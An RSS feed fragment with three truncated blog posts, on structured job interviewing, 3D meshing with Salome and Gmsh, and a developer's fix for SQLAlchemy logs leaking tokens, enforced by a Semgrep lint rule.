  <li><strong>Technically Skilled.</strong> Has the hard skills and knowledge required to do the job well.</li>
  <li><strong>Effective Communicator.</strong> Talks about their work in a way that we understand and trust.</li>
  <li><strong>Has Soft Skills We Value.</strong> There are certain strengths or skills that each company uniquely values, so articulate this here.</li>
</ol>

<p>Each of these higher-level competencies can be broken down into more specific ones, but remember to keep the total to 5 or fewer.</p>

<p>To help with the hacking, let’s explore each of these suggested competencies a bit further.</p>

<h3 id="technical-skills">Technical Skills</h3>

<p>“Wait,” you may be thinking. “The whole reason I’m reading this article is because I don’t know how to do this person’s job. Now you’re telling me to figure out how to assess their technical ability? What gives?!”</p>

<p>I know. It sucks. This will likely be the hardest competency for you to define. If you are hiring for a role that is the first of its kind in your company, you may not be able to describe it any more precisely than I already have, and that’s OK. We’ll talk about some ways to manage this in the next step.</p>

<p>Most people in this position will get help from a teammate or other connection who knows the technicals of the job. This is especially true if you’re hiring a new leader to level-up a more junior team that is already doing the work.</p>

<p>Your role is to keep their ideas <em>focused</em>. This is important, because subject-matter experts can have a hard time keeping this list under control. I’ve seen people struggle to pick fewer than 10 separate technical competencies that are important in their jobs.</p>

<p>You can help by finding ways to:</p>

<ul>
  <li>Coalesce competencies into larger areas of concern, and</li>
  <li>Eliminate things.</li>
</ul>

<p>If this is nerve-wracking, remember that time is always a constraint. More things on the list means longer interviews, and longer interviews mean less time for other important work. We’re not trying to cover every single thing that is important to the job; we’re trying to assess the most critical things with the time that we have.</p>

<h3 id="effective-communicator">Effective Communicator</h3>

<p>You may be unsurprised to find this in the list, but I want to highlight why I think this is especially important for a pioneering role.</p>

<p>If you’re creating a new kind of job in your team—even if it already exists somewhere else at your company— it’s really important that you can trust this person to furnish you with information in a way that helps you make effective decisions.</p>

<p>When we’re hiring for something new, we can get so focused on the person’s ability to do the job that we lose sight of how important it is for everyone to meaningfully understand <em>how the work is going</em>. This is especially important if this person is responsible for building an entirely new competency within the company, because it’s hard for new things to build momentum without understanding and trust.</p>

<p>To summarize: It’s important that this person can do the job. It’s also super important that they can explain it to you and others in a way that’s easy to understand. This understanding creates trust, and trust fuels meaningful results.</p>

<h3 id="has-soft-skills-we-value">Has Soft Skills We Value</h3>

<p>I once spoke to a founder who was looking for people who were “naturally inquisitive.” That sounded off to me, because it requires more than testing for curiosity; it requires us to determine whether that curiosity is <em>intrinsic</em>.</p>

<p>I asked for a concrete example of what “natural inquisitiveness” looked like. They said: “Well, at the lunch table, we’ll often have big debates about political or social issues. These are really fun, because people won’t just state their thoughts: They’ll try to find the logical arguments or fallacies behind the different positions. It’s not just an emotional conversation. We’re always looking to verify the underlying principles.”</p>

<p>From this starting point, we were eventually able to articulate the “soft skill” that they were looking for: A good candidate would <em>effectively apply the scientific method to everyday problems</em>.</p>

<p>This re-framing improves on the original in several ways:</p>

<ul>
  <li>It’s easier to assess than “naturally inquisitive”.</li>
  <li>It has less to do with <em>identity</em> and more to do with <em>ability</em>.</li>
  <li>It connects to a unique part of the company’s history, which was founded by scientists out of a university research project.</li>
</ul>

<p>Because first-time hires tend to be fraught with risk, I find that interviewers naturally want to latch onto something that helps …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/">https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/</a></em></p>]]>
            </description>
            <link>https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061052</guid>
            <pubDate>Wed, 11 Nov 2020 18:18:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overview of 3D meshing methods using open source tools]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25060942">thread link</a>) | @alibabaSX
<br/>
November 11, 2020 | https://www.sesamx.io/blog/3d_mesh_with_free_tools/ | <a href="https://web.archive.org/web/*/https://www.sesamx.io/blog/3d_mesh_with_free_tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        

<p>The Internet is full of beautiful 3D mesh examples, but it is difficult to get clues
about how they were constructed. In fact, <strong>creating a good 3D mesh can be very
painful without the right tools or training</strong>. Furthermore, most of commercial
pre-processing software have been improving and propose powerful 3D meshing algorithm,
capable of building hybrid or full hexahedron mesh. <strong>The aim of
this article is to give an overview of the constraints involved when building
a 3D mesh for structural finite element, as well as exposing various meshing
methods relying on free and open source tools</strong>.</p>

<h2 id="introduction">Introduction</h2>

<p>Before we start, let’s give some background information about 3D mesh
construction. Usually a 3D mesh can be composed of 4 types of elements:</p>

<ul>
<li><p>tetrahedron (4 corners),</p></li>

<li><p>wedge (6 corners),</p></li>

<li><p>hexahedron (8 corners),</p></li>

<li><p>and rarely pyramids (5 corners).</p></li>
</ul>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/3d_mesh_element_types.png" alt="3D mesh element types"></p>

<p><strong>The goal is to get a mesh with the lowest number of
degrees of freedom (“dofs”), while maintaining a good representative capability</strong>.
We may be
tempted to race for tetrahedrons, which have only 4 nodes (for a linear
element). But reality is more involved: <strong>certain types of elements behave better
than others</strong>. Without entering to much into the details, we can provide some hints
about this:</p>

<ul>
<li><p><strong>4-node tetrahedron (linear element) must be avoided as mush as possible</strong>. It
behaves poorly and a lot of them are needed to get meaningful results. If you
have no other choice, try to convert them to 10-node tetrahedron which is much
better.</p></li>

<li><p>if you want to stay with linear elements, <strong>you must aim towards hexahedron</strong>. Most
finite element software (you can guess that SesamX is part of them) propose an
improved version of the hexahedron element. That makes it a better choice than
the other elements.</p></li>

<li><p><strong>6-node wedge (linear element)</strong> is better than 4-node tetrahedron but worse than
8-node hexahedron. <strong>It is ok to use them, but go for hexahedron wherever possible</strong>.</p></li>

<li><p>I have not tested the pyramid enough to give relevant advice. Nevertheless,
from the fact that this element is seldom used in 3D mesh, this article will not
shed light on it.</p></li>
</ul>

<p>It is easy to build a full tetrahedron mesh using an automatic mesher
(and it is widespread among various software). On the contrary, <strong>full hexahedron or
hybrid automatic meshers are more involved and harder to find</strong> (you can find them
among commercial solutions but almost not among free ones).</p>

<p><strong>However, using only free and open source tools, we are still able to build
quality 3D meshes</strong>.</p>

<p>The remaining of <strong>this article exhibits 4 methods to build 3D meshes using Salome or
Gmsh</strong>. The goal is not to enter into every detail about the options used, but to
give an overview of how 3D meshes can be built. Whatever the tool we use, changing
the element order is usually a trivial task (either linear or quadratic).
Therefore I will not detail it here. Instead, <strong>I will focus on controlling the
element shapes while meshing</strong>.</p>

<p>For each method, I provide a step by step guide with illustrative screenshots. And, when
appropriate, I also provide the final result file that you can edit and modify
on your own.</p>

<h2 id="geometry-used">Geometry used</h2>

<p>I will use the following con rod to showcase how to build each mesh.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/con_rod_geometry.PNG" alt="Con rod geometry"></p>

<p>One important feature to mention here, is that <strong>this con rod geometry is made of
a compound of 3 solids</strong> (this reason will make sense when talking about the hybrid
mesh generation method) corresponding to each color on the image above.</p>

<p>You can find the corresponding step file
<a href="https://www.sesamx.io/blog/files/008_3d_mesh_with_free_tools/con_rod_to_mesh.step">here</a>.</p>

<h2 id="full-tetrahedron-automatic-meshing-method">Full tetrahedron automatic meshing method</h2>

<p>As mentioned before, <strong>it is pretty straightforward to get a full tetrahedron<br>
mesh</strong>. To build this mesh, we use <strong>Salome</strong>.</p>

<p>First, we go to the geometry module and import the step file. The Salome tree
should look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_import_tree.PNG" alt="Salome import tree"></p>

<p>Then we have to explode the compound geometry into its 3 sub-solids and create a
partition from these solids. <strong>This step is necessary to ensure that Salome will merge
coincident nodes from each solid faces</strong>. The result tree is then:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_partition_tree.PNG" alt="Salome partition"></p>

<p>Next we go to the mesh module, and create a new mesh on the partition. Under
algorithm we can select “NETGEN 1D-2D-3D” and under hypothesis “NETGEN 3D
Simple Parameters”. Finally we have to input the edge size that our elements should
have.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/tetrahedron_mesh_parameters.png" alt="Salome tetrahedron mesh parameters"></p>

<p>Eventually we have to right click on the mesh and hit “Compute”. The mesh should
look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/tetrahedron_mesh.PNG" alt="Salome tetrahedron mesh"></p>

<p>As you can see, the mesh is made of tetrahedron but also triangles and edges
elements. To get rid of the 2D and 1D elements, the first step is to
click on the mesh and select “Create Group”. A panel appear and we can create one
group containing all the 2D elements (as shown on the picture below) and
similarly for the 1D elements.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_create_group.png" alt="Salome create group"></p>

<p>Next to delete these elements, we have to right
click on each group and select “Delete Group with Content”. <strong>And we get
the following full tetrahedron mesh</strong>.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/final_tetrahedron_mesh.PNG" alt="Salome final tetrahedron mesh"></p>

<p>Finally, <strong>to check that the mesh does not contain any duplicated nodes</strong> we have to
select the mesh and use “Controls / Node Controls / Double Nodes”.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/full_tet_double_nodes.PNG" alt="Tetrahedron duplicated nodes check"></p>

<p>If you want to manipulate this mesh, you can find the corresponding Salome database
<a href="https://www.sesamx.io/blog/files/008_3d_mesh_with_free_tools/full_tet_con_rod.hdf">here</a>.</p>

<h2 id="full-hexahedron-automatic-meshing-method">Full hexahedron automatic meshing method</h2>

<p>Next come the full hexahedron mesh. To build this mesh, we use <strong>Gmsh</strong>.</p>

<p>First, <strong>it is necessary to create a volume physical group containing the 3
solids of the model. It ensure afterwards that the mesh export will, in fact,
export only the 3D elements.</strong></p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/gmsh_volume_physical_group.PNG" alt="Gmsh volume physical group"></p>

<p>Next we go to “Tools / Options” then “Mesh / General” to select the meshing
parameters. We can
choose whatever makes it for the 2D algorithm, 3D algorithm and 2D recombination
algorithm. These parameters influence how the mesh is built, feel free to change
them to notice the difference in the mesh. As a first guess, we can
stay with “Delaunay” and “Blossom”. However, <strong>make sure to select “All Hexas” as the
“Subdivision algorithm” so that the volumes will be filled with hexahedron only.</strong></p>

<p>Finally under “Min/Max element size” we can fix the element size.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/gmsh_meshing_parameters.PNG" alt="Gmsh meshing parameters"></p>

<p>Eventually, we have to go back to the Gmsh tree and click “3D” under “Mesh” to
build the mesh.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/gmsh_mesh_creation.png" alt="Gmsh mesh creation"></p>

<p>We can check the mesh content under “Tools / Statistics”. As you can see, the mesh
is made of 1D, 2D and 3D-hexahedron elements. <strong>Because we have created a physical
group for the 3 volumes, only the 3D mesh will be exported.</strong></p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/final_hexaedron_mesh.PNG" alt="Gmsh mesh creation"></p>

<p>If you have troubles visualizing the 3D elements, you can adjust the visibility
parameters in the “Mesh” options window under the “Visibility” tab.</p>

<p>Unfortunately, there is a trap here. <strong>The mesh obtained has duplicated nodes</strong>
at the interfaces between the 3 solids. To visualize them, we can export the mesh
as a .med file, import it in Salome, and use the “double nodes” tool mentioned
previously.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/full_hexahedron_duplicated_nodes.PNG" alt="Hexahedron duplicated nodes"></p>

<p>Finally, to solve this issue, we have to use the “Merge Nodes” tool under
“Modification / Transformation”.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/full_hexahedron_remove_duplicated.PNG" alt="Hexahedron remove duplicated nodes"></p>

<h2 id="hybrid-meshing-method">Hybrid meshing method</h2>

<p>Next <strong>I am showcasing how to build an efficient hybrid mesh with Salome.</strong> This
method is my favorite because <strong>it leads to a well structured mesh, which can
capture more efficiently the details of the geometry</strong> (if you have a close look
to the automatic tetrahedron and hexadreon meshes, you can see that the fillet
is not always “well captured” for instance). The drawback of this method is that it does not
lead to a full hexahedron mesh but an hybrid mesh made with a majority of
hexahedrons, and a minority of wedges used to fill gaps.</p>

<p><strong>The 3D mesh will be built first by meshing 2D surfaces and then by extruding
them.</strong> To make this process workable, the geometry has been split into 3 solids
beforehand. Each of these solids can then be meshed as an extrusion of the surface
meshes.</p>

<table>
<thead>
<tr>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybride_mesh_solid_1.PNG" alt="Solid 1"></th>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybride_mesh_solid_2.PNG" alt="Solid 2"></th>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybride_mesh_solid_3.PNG" alt="Solid 3"></th>
</tr>
</thead>

<tbody>
<tr>
<td><center><em>Solid 1</em></center></td>
<td><center><em>Solid 2</em></center></td>
<td><center><em>Solid 3</em></center></td>
</tr>
</tbody>
</table>

<p>As explained for the full-tetrahedron mesh, <strong>we first need to explode the
compound geometry and build a partition.</strong></p>

<p>Then, in order to build the 2D meshes on the surfaces and the 3D extrusion meshes,
we need to extract (using explode) the relevant geometries from this partition:</p>

<ul>
<li>the 3 solids geometries,</li>
<li>the top face of solid 1 (red face on solid 1 image), that will drive the
3D mesh on solid 1,</li>
<li>the “fillet face” of solid 2 and 3 (red face on solid 3 image) that will drive
the 3D mesh on solid 2 and solid 3.</li>
</ul>

<p>The Salome tree should look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_partition_tree_hybrid.PNG" alt="Salome tree for hybrid mesh"></p>

<p>Next, we go to the mesh module. The meshing process is the following:</p>

<ul>
<li><p>Create a mesh object and assign default 3D mesh parameters to the whole
partition,</p></li>

<li><p>Create 2 sub-meshes for the 2 surfaces to mesh,</p></li>

<li><p>Create 3 sub-meshes for the 3 solids to mesh.</p></li>
</ul>

<p><strong>The default 3D meshing parameters will not be used while computing the mesh,
because the sub-meshes definition will cover the whole partition.</strong> Nevertheless, Salome
still requires these default parameters.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/tetrahedron_mesh_parameters.png" alt="Salome import tree"></p>

<p>To create the faces sub-meshes, we have to right click on the mesh and
select “Create Sub-mesh”. We then need to select one of the faces and choose the
“NETGEN 1D-2D”
algorithm with “NETGEN 2D Simple Parameters”. Then we can input the element size
and <strong>make sure to check “Quad-dominated” (to avoid at most triangles)</strong>.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/face_submesh_parameters.png" alt="Salome face submesh parameters"></p>

<p>To compute the sub-mesh, we have to right click on it and select “Compute
Sub-mesh”. And we repeat these operations for the second face.</p>

<p><strong>Creating the 3D sub-meshes is similar.</strong> Once we have selected the solid to mesh,
we choose “Extrusion 3D” as the meshing algorithm and no hypothesis needs to be associated.
However, we have to provide the 1D algorithm and hypothesis to define
how the mesh extrusion should behave.</p>

<p>We select “Wire Discretisation” as the 1D algorithm, and the previous local length
used for the 2D sub-meshes as the hypothesis.</p>

<table>
<thead>
<tr>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_3d_submesh_parameters.png" alt="Hybrid 3D submesh parameters"></th>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_1d_submesh_parameters.png" alt="Hybrid 1D submesh parameters"></th>
</tr>
</thead>

<tbody>
<tr>
<td><center><em>3D submesh parameters</em></center></td>
<td><center><em>1D submesh parameters</em></center></td>
</tr>
</tbody>
</table>

<p>We repeat this for the 2 other solids. The mesh tree should look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_mesh_tree.PNG" alt="Salome hybrid mesh tree"></p>

<p><strong>Before computing the mesh, we need to tell Salome in which order the sub-meshes
should be computed.</strong> To avoid meshing conflict while extruding, it is best in
our case, to fully mesh solid 1 before meshing the driving surface of solid 2
and solid 3. We have to right click on the mesh and select “Change sub-mesh Priority”.
The meshing order should be the following:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_mesh_order.PNG" alt="Salome hybrid mesh tree"></p>

<p>After …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sesamx.io/blog/3d_mesh_with_free_tools/">https://www.sesamx.io/blog/3d_mesh_with_free_tools/</a></em></p>]]>
            </description>
            <link>https://www.sesamx.io/blog/3d_mesh_with_free_tools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060942</guid>
            <pubDate>Wed, 11 Nov 2020 18:07:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing leaky logs: how to find a bug and ensure it never returns]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060456">thread link</a>) | @pabloest
<br/>
November 11, 2020 | https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><blockquote>
<p><strong>TL;DR</strong> I lay out a case for moving security enforcement into the hands
of developers. I show how I and another developer at r2c successfully identified data
leakage in our logs, fixed the issue, and prevented it from happening in the
future. We did this <em>in a matter of hours, without assistance from our AppSec team</em>.</p>
</blockquote>
<h2>Introduction</h2>
<p>As a developer and engineering manager, I’ve become obsessed with finding ways
to rapidly solve security issues across the engineering organization without ever
needing to fully involve our security team.</p>
<p>Why is this important? I see multiple benefits:</p>
<ul>
<li>Fixing security issues is <em>fast</em>. So fast, in fact, that we can solve them in
minutes after identifying them, without security issues languishing for days
or weeks. In previous roles, I've seen internally known security issues lie
open with only obscurity protecting my organization from fallout.</li>
<li>When developers can solve security issues easily themselves, it frees the
security team to focus on “big picture” security. I want security engineers
to be thinking how to choose frameworks, set up tools, help with secure
architecture, and build defense-in-depth—not finding my last XSS mistake.</li>
</ul>
<p>I call this concept “self-service DevSec”.</p>
<p>In the rest of this blog post, I'll walk through a security bug we encountered
during the day-to-day course of regular development work. I'll discuss how we
discovered the issue, and how, within just a few hours, fixed the security
issue, and used Semgrep to prevent the bug from reoccurring.</p>
<p>Here's the story:</p>
<h2>Story</h2>
<p>Last month, I was debugging a Flask web-app authentication workflow with
Clara McCreery, another engineer at r2c. Like many engineers faced with
a confusing debugging problem, one of our first steps was to throw the web-app
into debug logging.</p>
<p>Specifically, we wanted to know what was going on with our database operations,
so we set our ORM (in this case, we use SQLAlchemy) into INFO-level logging with:</p>
<div data-language="py"><pre><code>logging<span>.</span>getLogger<span>(</span><span>"sqlalchemy.engine.base.Engine"</span><span>)</span><span>.</span>setLevel<span>(</span>logging<span>.</span>INFO<span>)</span></code></pre></div>
<p>This configures SQLAlchemy to log all SQL statements, together with passed
parameters. Let's look at some of the output we saw:</p>
<div data-language="shell-session"><pre><code><span>INFO:werkzeug:127.0.0.1 - - [25/Sep/2020 11:50:01] "POST /api/auth/authenticate HTTP/1.1" 200 -
INFO:sqlalchemy.engine.base.Engine:BEGIN (implicit)
INFO:sqlalchemy.engine.base.Engine:SELECT token.id AS token_id, token.token AS token_token, token.name AS token_name
FROM token
WHERE token.token = %(token_1)s
 LIMIT %(param_1)s
</span><span>INFO<span>:</span><span>sqlalchemy.engine.base.Engine:{'token_1': </span></span><span><span>$</span><span>2a<span>$10</span><span>$KVsyW1jjKn</span>.pvkVi3w9Rn.1mwnZFd7F2SFveGDG8flIhbe.MoJH4G, <span>'param_1'</span><span>:</span> <span>1</span><span>}</span></span></span></code></pre></div>
<p>...Uh-oh.</p>
<p>We definitely shouldn’t be logging tokens (even if they're securely hashed).
(In this example the actual token value has been changed to protect
the innocent.)</p>
<h2>Let’s make a plan</h2>
<p>At this point we’ve identified a security issue, and we want to stomp it out
while preserving our ability to inspect logs. Our plan:</p>
<ol>
<li>Mitigate the immediate security issue.</li>
<li>Find a permanent solution to the problem that’s future proof. A permanent
solution means a baked-in change to our systems. Ideally this solution is
automated and seamless across our entire organization.</li>
<li>Add a mechanism to enforce our solution’s use organization-wide.</li>
</ol>
<p>In the rest of this post, I’ll walk you through how we addressed each step.
Notably, we were able to accomplish this entire flow in a couple hours, without
engaging the security team at all.</p>
<h3>1. Mitigation</h3>
<p>Mitigation here was fairly straightforward, as we already knew the root cause
of our problem. We can quickly revert our logging change. Then we can do
a quick audit of our logs to ensure that only development test tokens were
leaked.</p>
<h3>2. The permanent solution</h3>
<p>How do we prevent SQLAlchemy from logging sensitive data?</p>
<p><em>A valiant attempt</em></p>
<p>Step 1 was to read the docs. A quick web search of “sqlalchemy hide parameters
in engine logging” linked us to the SQLAlchemy <a href="https://docs.sqlalchemy.org/en/13/core/engines.html" target="_blank" rel="noopener">Engine
documentation</a>. A detailed
read later, we found the <code>hide_parameters</code> flag, which prevents the logging
framework from emitting <em>any</em> parameters in logs or exceptions.</p>
<p>While this certainly would prevent our security issue, it was too blunt of a hammer
for us: we wanted to know (for example) database IDs, and the like, for debugging.</p>
<p><em>The real solution</em></p>
<p>We then inspected the relevant SQLAlchemy <a href="https://github.com/sqlalchemy/sqlalchemy/tree/master/lib/sqlalchemy" target="_blank" rel="noopener">source
code</a>. The
relevant code is in <code>sqlalchemy/engine/base.py</code>:</p>
<div data-language="py"><pre><code>    <span>if</span> self<span>.</span>_echo<span>:</span>
        self<span>.</span>engine<span>.</span>logger<span>.</span>info<span>(</span>statement<span>)</span>
        <span>if</span> <span>not</span> self<span>.</span>engine<span>.</span>hide_parameters<span>:</span>
            self<span>.</span>engine<span>.</span>logger<span>.</span>info<span>(</span>
                <span>"%r"</span><span>,</span>
                sql_util<span>.</span>_repr_params<span>(</span>
                    parameters<span>,</span> batches<span>=</span><span>10</span><span>,</span> ismulti<span>=</span>context<span>.</span>executemany
                <span>)</span><span>,</span>
            <span>)</span></code></pre></div>
<p><code>sql_util._repr_params</code>, in turn, runs:</p>
<div data-language="py"><pre><code><span>def</span> <span>_repr_params</span><span>(</span>self<span>,</span> params<span>,</span> typ<span>)</span><span>:</span>
    trunc <span>=</span> self<span>.</span>trunc
    <span>if</span> typ <span>is</span> self<span>.</span>_DICT<span>:</span>
        <span>return</span> <span>"{%s}"</span> <span>%</span> <span>(</span>
            <span>", "</span><span>.</span>join<span>(</span>
                <span>"%r: %s"</span> <span>%</span> <span>(</span>key<span>,</span> trunc<span>(</span>value<span>)</span><span>)</span>
                <span>for</span> key<span>,</span> value <span>in</span> params<span>.</span>items<span>(</span><span>)</span>
            <span>)</span>
        <span>)</span>
    <span>.</span><span>.</span><span>.</span></code></pre></div>
<p>Investigating <code>trunc</code>, we found that it converts the parameter value by
truncating the parameter’s <code>repr</code> to a maximum number of characters.</p>
<p>This meant that we should override the <code>repr</code> method of the parameter object to
prevent sensitive logging.</p>
<p>At this point, like good engineers, we took the lazy route: stand on your
peers’ shoulders. I found <a href="https://github.com/sqlalchemy/sqlalchemy/issues/4806" target="_blank" rel="noopener">this GitHub
issue</a>, where <a href="https://techspot.zzzeek.org/" target="_blank" rel="noopener">Mike
Bayer</a> had already posted a nice solution.</p>
<p>Some shameless copying later (and adding some types to make <code>mypy</code> happy), we
had <a href="https://gist.github.com/nbrahms/2fee940f4d87f09ffc3823be5a334cf3" target="_blank" rel="noopener">this
Gist</a>. The
key code is:</p>
<div data-language="py"><pre><code><span>class</span> <span>ObfuscatedString</span><span>(</span>types<span>.</span>TypeDecorator<span>)</span><span>:</span>
    <span>"""
    String column type for use with SQLAlchemy models whose
    content should not appear in logs or exceptions
    """</span>

    impl <span>=</span> types<span>.</span>String

    <span>class</span> <span>Repr</span><span>(</span><span>str</span><span>)</span><span>:</span>
        <span>def</span> <span>__repr__</span><span>(</span>self<span>)</span> <span>-</span><span>&gt;</span> <span>str</span><span>:</span>
            <span>return</span> <span>"********"</span>

    <span>def</span> <span>process_bind_param</span><span>(</span>self<span>,</span> value<span>:</span> Optional<span>[</span><span>str</span><span>]</span><span>,</span> dialect<span>:</span> Any<span>)</span> <span>-</span><span>&gt;</span> Optional<span>[</span>Repr<span>]</span><span>:</span>
        <span>return</span> self<span>.</span>Repr<span>(</span>value<span>)</span> <span>if</span> value <span>else</span> <span>None</span>

    <span>def</span> <span>process_result_value</span><span>(</span>
        self<span>,</span> value<span>:</span> Optional<span>[</span>Repr<span>]</span><span>,</span> dialect<span>:</span> Any
    <span>)</span> <span>-</span><span>&gt;</span> Optional<span>[</span><span>str</span><span>]</span><span>:</span>
        <span>return</span> <span>str</span><span>(</span>value<span>)</span> <span>if</span> value <span>else</span> <span>None</span>


<span>setattr</span><span>(</span>db<span>,</span> <span>"ObfuscatedString"</span><span>,</span> ObfuscatedString<span>)</span></code></pre></div>
<p>What does this code accomplish? It replaces our original <code>str</code> parameters
with a new <code>ObfuscatedString.Repr</code> parameter. When logged (or when emitted
into an exception message), the string is replaced by our <code>********</code>
obfuscation sentinel. Since the parameter is still bound as a raw string (via
<code>impl = types.String</code>), the correct value is still inserted and selected from
the database.</p>
<p>To use this new column type, we set our <code>token</code>’s column type:</p>
<div data-language="py"><pre><code><span>class</span> <span>Token</span><span>(</span>db<span>.</span>Model<span>)</span><span>:</span>
    <span>.</span><span>.</span><span>.</span>
    token <span>=</span> db<span>.</span>Column<span>(</span>db<span>.</span>ObfuscatedString<span>,</span> <span>.</span><span>.</span><span>.</span><span>)</span>
    <span>.</span><span>.</span><span>.</span></code></pre></div>
<p>We then re-enabled INFO logging, and checked that we were properly obfuscating
text:</p>
<div data-language="shell-session"><pre><code><span>INFO:werkzeug:127.0.0.1 - - [25/Sep/2020 13:48:55] "GET /api/agent/deployments/1/policies HTTP/1.1" 200 -
INFO:sqlalchemy.engine.base.Engine:BEGIN (implicit)
INFO:sqlalchemy.engine.base.Engine:SELECT token.id AS token_id, token.token AS token_token, token.name AS token_name
FROM token
WHERE token.token = %(token_1)s
 LIMIT %(param_1)s
INFO:sqlalchemy.engine.base.Engine:{'token_1': ********, 'param_1': 1}</span></code></pre></div>
<p>For completeness, we also validated in our development database console that the
correct values were stored and retrieved.</p>
<p>Great success! 🚢 Ship it.</p>
<h3>3. Enforcement</h3>
<p>It was tempting to rest on our laurels here. We had solved our security issue for
the time being, and we could get back to debugging our original auth issue.</p>
<p>But we wanted to guarantee that <em>we would never see this issue again</em>. How would we do
this?</p>
<p>Here are some ideas that I’m sure we’ve all encountered before:</p>
<ol>
<li>Block all commits to SQLAlchemy models on security review!</li>
<li>Host a yearly security training for all devs, including the pitfalls of
logging sensitive data!</li>
<li>Audit logs weekly!</li>
<li>File an issue with your SAST provider, demanding they add checks to catch
sensitively logged data!</li>
</ol>
<p>If there is a central take-away from this blog post, it is this: these are not
ideal solutions:</p>
<ol>
<li>Blocking commits introduces needless friction into the development
process, slows development velocity, and needlessly distracts the security
team.</li>
<li>Security trainings are an important component to a security program, and
necessary to keep developers aware of evolving security threats, but humans
have fallible memory, and we can forget things we've heard months or even
days in the past.</li>
<li>Regular audits, like blocking commits, introduce a heavy workload on an
almost certainly overloaded security team.</li>
<li>Your SAST provider will certainly welcome your suggestion, but you will be
beholden to their software release cycle, and may not see checks be
available for months; furthermore, if your issue is domain-specific, it may
not even make sense for a check to be implemented within a generalist product.</li>
</ol>
<p>Fortunately, Semgrep gave us a simple solution here: Define an
<em>invariant</em> in your code, and <em>enforce</em> it using a Semgrep scan on every CI
run.</p>
<p>At r2c, we use GitHub Actions to run Semgrep on every merge request. We define
what checks Semgrep should run using <em>a managed policy</em>, a list of rules and
notification settings managed by <a href="https://semgrep.dev/" target="_blank" rel="noopener">semgrep.dev</a>.</p>
<p>To guarantee our code against future issues, I went to
<a href="https://semgrep.dev/editor" target="_blank" rel="noopener">semgrep.dev/editor</a> and wrote <a href="https://semgrep.dev/s/nbrahms:obfuscate-sensitive-string-columns-2" target="_blank" rel="noopener">a quick rule</a>
to detect potential insecurely logged SQLAlchemy columns.</p>
<p>Here's the rule definition in Semgrep's YAML definition language:</p>
<div data-language="yaml"><pre><code><span>rules</span><span>:</span>
<span>-</span> <span>id</span><span>:</span> obfuscate<span>-</span>sensitive<span>-</span>string<span>-</span>columns
  <span>patterns</span><span>:</span>
    <span>-</span> <span>pattern</span><span>:</span> <span>|</span><span>
        $COLUMN = db.Column(db.String, ...)</span>
    <span>-</span> <span>metavariable-regex</span><span>:</span>
        <span>metavariable</span><span>:</span> $COLUMN
        <span>regex</span><span>:</span> <span>'.*(?&lt;![A-Za-z])(token|key|email|secret)(?![A-RT-Za-rt-z]).*'</span>
  <span>message</span><span>:</span> <span>|</span><span>
    '$COLUMN' may expose sensitive information in logs and exceptions. Use
    'db.ObfuscatedString' instead of 'db.String'.</span>
  <span>severity</span><span>:</span> WARNING</code></pre></div>
<p>What does this rule do? Let’s break it down:</p>
<ul>
<li><code>id</code>: We give our rule a concise descriptive ID for easy reference by any developer who
sees it pop up in their editor or CI output.</li>
<li>
<p><code>patterns</code>: This is composed of two parts:</p>
<ul>
<li><code>pattern</code>: This expression tells Semgrep to …</li></ul></li></ul></div></div></div></section></div>
